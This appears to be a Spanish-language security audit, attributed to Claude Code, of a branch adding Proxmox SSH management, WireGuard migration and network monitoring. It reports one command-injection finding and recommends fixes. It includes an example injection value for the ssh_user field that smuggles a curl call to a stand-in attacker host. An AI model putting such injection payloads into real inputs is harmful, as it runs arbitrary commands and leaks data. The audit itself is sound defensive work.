# Revisión de seguridad — rama `dev`

**Fecha:** 2026-06-20
**Alcance:** cambios introducidos en `dev` respecto a `main` (commits `d21a6a0..8c174ba`)
**Revisor:** análisis enfocado en seguridad (Claude Code)

Funcionalidad nueva revisada: monitoreo agentless (HTTP/TCP/ICMP), auto-descubrimiento de
red (barrido CIDR), canales de notificación (Slack/Discord/Telegram/webhook), gestión Proxmox
por SSH (`qm`/`pct`/`vzdump`/`wg`), migración por túnel WireGuard, retención de datos e
inventario unificado.

---

## Resumen ejecutivo

No se encontró ninguna vulnerabilidad **explotable de alta confianza** introducida por esta
rama que cruce un límite de privilegio. El código está, en general, bien endurecido:

- Validadores allowlist estrictos (`proxmox/validators.py`) que alimentan listas `argv`
  citadas con `shlex.quote` antes de ejecutar por SSH.
- Esquemas de respuesta que omiten deliberadamente secretos (p. ej. `SMTPConfigResponse`
  ya no expone `password`).
- Secretos cifrados con Fernet; no se registran ni se devuelven en claro.
- Deserialización con `json` (sin `pickle`/`yaml.load`/`eval`).
- Consultas vía ORM parametrizado (sin SQL string-building).
- Verificación de host key SSH por TOFU con detección de cambio de clave.
- `require_admin` server-side en todos los endpoints mutantes de Proxmox / notificaciones /
  descubrimiento.
- Sin `v-html` en las vistas Vue (sin XSS DOM introducido).

Se documenta **un (1) hallazgo Medium de defensa en profundidad** por transparencia, con la
salvedad explícita de que no es un escalamiento de privilegios real.

| # | Severidad | Categoría | Ubicación | Cruza límite de privilegio |
|---|-----------|-----------|-----------|----------------------------|
| 1 | Medium    | Command injection | `proxmox/wireguard.py:165-170` | No (solo admin, capacidad ya equivalente) |

---

## Hallazgo 1 — Inyección de comandos vía `ssh_user` sin validar (defensa en profundidad)

- **Severidad:** Medium
- **Confianza (inyección real):** ~0.75
- **Impacto real:** Bajo — no cruza un límite de privilegio
- **Categoría:** `command_injection`
- **Ubicación:** `src/server/app/proxmox/wireguard.py:165-170`

### Descripción

En `migrate_guest`, el comando de transferencia `rsync` se construye como un f-string de
Python que luego se ejecuta vía `ssh_executor.run_command(source_node, ["sh", "-c", transfer], ...)`:

```python
target_user = (target_node.ssh_user or "root")
transfer = (
    f"rsync -e 'ssh -o StrictHostKeyChecking=accept-new' -av "
    f"{archive} {target_user}@{target_ip}:{DUMP_DIR}/"
)
rc, out, err = ssh_executor.run_command(source_node, ["sh", "-c", transfer], timeout=3600)
```

`archive` y `target_ip` **sí** se validan/acotan (regex de path de dump y
`valid_tunnel_ip`), pero `target_user` se interpola directamente, sin validación ni
`shlex.quote`. El campo `ssh_user` no tiene validación de caracteres en la creación del nodo
(`ProxmoxNodeCreate.ssh_user: str = "root"` en `schemas.py:389`; columna `String(255)` en
`models.py:263`). Un valor como `root@x;curl http://atacante/$(id);#` rompería el argumento
`user@ip:path` previsto y ejecutaría comandos arbitrarios en el **nodo de origen**.

### Escenario de explotación

Un administrador crea un nodo Proxmox destino con `ssh_user` apuntando a un payload de
inyección y luego dispara `POST /api/proxmox/migrate`. El payload se ejecuta en el nodo de
origen durante el paso de transferencia.

**Salvedad (por qué NO es un hallazgo explotable de alto impacto):** el único actor capaz de
llegar aquí es un administrador, que ya puede ejecutar comandos root arbitrarios sobre esos
mismos nodos a través de **todos** los demás endpoints Proxmox (`qm`/`pct`/`vzdump`). Por
tanto, esta ruta no permite a ningún actor hacer algo que no pudiera hacer ya. Es una
**inconsistencia de defensa en profundidad** (el único campo de configuración de nodo que se
salta la disciplina de citado uniforme), no un escalamiento de privilegios.

### Recomendación

- Validar `ssh_user` con el allowlist existente (`_NAME_RE`/`valid_name`) en la creación del
  nodo, **y/o**
- Pasar la invocación `rsync` como lista `argv` citada (o `shlex.quote(target_user)`) en
  lugar de un string `sh -c` interpolado.

Esto elimina la única inconsistencia donde un campo de configuración de nodo evade el citado
uniforme aplicado en el resto del ejecutor SSH.

---

## Áreas verificadas como limpias

| Área | Resultado |
|------|-----------|
| Inyección de argumentos ICMP/`ping` | Host validado; prefijo `-` rechazado en dos capas (`monitoring/validators.py`, ejecutor) |
| Barrido CIDR de descubrimiento | Parseado con `ipaddress`, acotado en tamaño y concurrencia |
| TOFU de host key SSH | Mismatch aborta la conexión (`proxmox/ssh_executor.py`) |
| SSRF en canales de notificación | Solo admin; se fuerza `https`/token de Telegram (`notifications/channels.py`, `monitoring/validators.py`) |
| Exposición de secretos en respuestas/logs | Ninguna; `SMTPConfigResponse` ya no devuelve `password`; webhook no registra token |
| Inyección SQL | No aplica — ORM parametrizado |
| Deserialización insegura | Solo `json`; sin `pickle`/`yaml`/`eval` |
| XSS en Vue | Sin `v-html`/`innerHTML` en las vistas modificadas |
| AuthZ de endpoints mutantes | `require_admin` server-side verificado |

---

## Metodología

1. Investigación de contexto del repositorio (frameworks/patrones de seguridad existentes).
2. Análisis comparativo del código nuevo frente a los patrones seguros establecidos.
3. Evaluación de vulnerabilidades por archivo, trazando el flujo de datos desde entradas de
   usuario hasta operaciones sensibles (ejecución SSH, comandos de shell, consultas, respuestas).

Exclusiones aplicadas por política: DoS / agotamiento de recursos, secretos en disco,
rate limiting, librerías de terceros desactualizadas, hallazgos solo en documentación.
